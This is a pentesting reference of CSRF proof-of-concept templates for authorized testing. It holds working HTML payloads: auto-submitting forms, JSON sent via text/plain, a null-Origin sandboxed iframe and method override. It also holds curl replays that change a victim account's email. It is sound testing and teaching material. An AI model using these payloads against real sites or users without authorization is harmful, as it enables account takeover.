# Proof-of-Concept Templates

These are the standard shapes used to confirm a CSRF finding on a system you are
authorized to test. They are diagnostic tools: each one answers a specific
question about which control is or is not enforced.

**Before using any of these**: confirm authorization, use a dedicated test
account as the victim, pick the least destructive action that proves the class,
and note what you changed so it can be reverted. Host the page locally
(`file://` or `localhost`) unless the program requires a hosted PoC. Do not send
a PoC link to anyone who has not consented to receive it.

Replace `TARGET`, parameter names and values with the endpoint under test.

## Contents

- [Capturing the baseline request](#capturing-the-baseline-request)
- [GET-based](#get-based)
- [POST, form-encoded](#post-form-encoded)
- [POST, multipart](#post-multipart)
- [JSON endpoint via text/plain](#json-endpoint-via-textplain)
- [Testing a custom-header requirement](#testing-a-custom-header-requirement)
- [Testing the null Origin path](#testing-the-null-origin-path)
- [Method override](#method-override)
- [Interpreting the result](#interpreting-the-result)

---

## Capturing the baseline request

Start from the real request, taken from the browser's network tab as "Copy as
cURL" or from an intercepting proxy. Then reproduce it exactly and remove one
thing at a time. Building a PoC from the API documentation instead of from an
observed request is how false positives and false negatives both happen.

Record for the baseline: method, full URL, `Content-Type`, every body parameter,
every custom header, and which cookies are attached.

---

## GET-based

If a state change is reachable by GET, the PoC is a link or a resource load.
This also passes `SameSite=Lax`, which is what makes it serious.

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>CSRF PoC — GET</h1>
    <!-- fires on load -->
    <img src="https://TARGET/account/email?new=attacker%40example.test" alt="">
  </body>
</html>
```

For a top-level navigation (the variant that carries `SameSite=Lax` cookies):

```html
<a href="https://TARGET/account/email?new=attacker%40example.test">Click</a>
<!-- or, to test without interaction: -->
<script>location = 'https://TARGET/account/email?new=attacker%40example.test';</script>
```

Note the difference in the report: an `<img>` load is a subresource request
(blocked for `Lax` cookies), a top-level navigation is not.

---

## POST, form-encoded

The canonical CSRF PoC.

```html
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <h1>CSRF PoC — POST</h1>
    <form action="https://TARGET/account/email" method="POST">
      <input type="hidden" name="email" value="attacker@example.test">
      <input type="hidden" name="confirm" value="attacker@example.test">
      <!-- omit the token parameter entirely, or set it empty, per the test being run -->
    </form>
  </body>
</html>
```

To keep it non-automatic while demonstrating, drop the `onload` and leave a
submit button — useful when recording a video for a report, and safer when the
page might be opened accidentally.

Variants worth testing separately, one at a time:

- Token parameter absent
- Token parameter present but empty
- Token parameter present with a valid token from a *different* session

---

## POST, multipart

Some endpoints only accept `multipart/form-data` (file upload handlers,
Spring's multipart resolver). A form can produce it natively:

```html
<form action="https://TARGET/profile/avatar" method="POST"
      enctype="multipart/form-data">
  <input type="hidden" name="displayName" value="csrf-test">
</form>
```

File inputs cannot be pre-filled from an attacker page, so file *contents* cannot
be forged this way — but the accompanying fields can, which is often enough.

---

## JSON endpoint via text/plain

The key test for any endpoint claimed to be "safe because it's JSON". A form can
only send three content types, but `text/plain` bodies can be shaped into valid
JSON using the name/value concatenation an HTML form performs.

An HTML form with `enctype="text/plain"` sends `name=value` per field, joined by
CRLF. Put the JSON prefix in the field name and the suffix in the value:

```html
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <h1>CSRF PoC — JSON via text/plain</h1>
    <form action="https://TARGET/api/account/email" method="POST"
          enctype="text/plain">
      <input name='{"email":"attacker@example.test","padding":"'
             value='"}'>
    </form>
  </body>
</html>
```

The body sent is:

```
{"email":"attacker@example.test","padding":"="}
```

The trailing `=` from the form encoding is absorbed by the padding string, so the
result parses as JSON.

**What the result means:**

- Request succeeds → the server parses JSON regardless of `Content-Type`. The
  preflight protection does not apply. This is a real finding.
- Request rejected with a content-type error → the server enforces
  `application/json`, so cross-origin requests require a preflight. Note in the
  report that the protection is a side effect of strict content-type handling
  rather than a deliberate control, and recommend an explicit one.

Also test the plain form-encoded version of the same endpoint — many frameworks
parse both transparently, which removes the need for this trick entirely.

---

## Testing a custom-header requirement

If the application sends `X-Requested-With: XMLHttpRequest` or a similar header,
test whether the server actually requires it. There is no way to add a custom
header to a cross-origin request without a preflight, so if the server enforces
it, the endpoint is protected.

Test from the server side by replaying the request **without** the header, using
the victim session's cookies, in a normal HTTP client:

```bash
curl -i -X POST 'https://TARGET/api/account/email' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'session=<test-account-session-cookie>' \
  --data 'email=attacker@example.test'
```

- Succeeds without the header → the header is decorative; the endpoint relies on
  nothing. Finding.
- Rejected → the header is enforced and is a genuine control.

This is a replay, not a browser-based PoC — it tells you what the server
enforces, which is the question. If it succeeds, build the browser PoC to
demonstrate exploitability.

---

## Testing the null Origin path

If the endpoint validates `Origin` but might accept `null`, a sandboxed iframe
produces that origin:

```html
<iframe sandbox="allow-forms allow-scripts allow-top-navigation"
        srcdoc='
  &lt;form action="https://TARGET/account/email" method="POST"&gt;
    &lt;input name="email" value="attacker@example.test"&gt;
  &lt;/form&gt;
  &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
'></iframe>
```

A request from a sandboxed context carries `Origin: null`. If the server accepts
it, the allowlist or the null-handling is the finding.

Note that `SameSite` still applies to the cookie independently — a `Lax` cookie
will not be sent on this subresource POST. If it fails, determine which control
blocked it before concluding the Origin check is sound.

---

## Method override

Test whether a mutating handler is reachable by a method the CSRF filter treats
as safe, or by a different method than the one protected:

```html
<!-- framework-level override in the body -->
<form action="https://TARGET/api/resource/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
```

```bash
# header-based override, replayed with the session cookie
curl -i -X POST 'https://TARGET/api/resource/123' \
  -H 'X-HTTP-Method-Override: DELETE' \
  -b 'session=<test-account-session-cookie>'
```

Also test the reverse: sending the state-changing request as GET, in case the
route accepts multiple verbs.

---

## Interpreting the result

Do not stop at "it worked". For the report, establish:

1. **Which control was absent or bypassed** — no token, token not validated,
   token not session-bound, Origin check absent, content-type not enforced.
2. **Whether the session cookie was actually sent.** Check the server-side effect,
   not just a 200 response. A 200 that returns the login page means the cookie
   was dropped by `SameSite` and the PoC did not demonstrate what it appears to.
3. **Which browser confirmed it**, and whether the result depends on a browser
   default rather than an application decision.
4. **Whether user interaction was required** (a click for top-level navigation
   vs. none for auto-submit).
5. **What was changed on the target**, so it can be reverted and disclosed in the
   report.

A PoC that produces a 200 without a verified state change is the most common
false positive in CSRF reporting. Verify the effect in the application UI or
database, with the victim account, before writing it up.
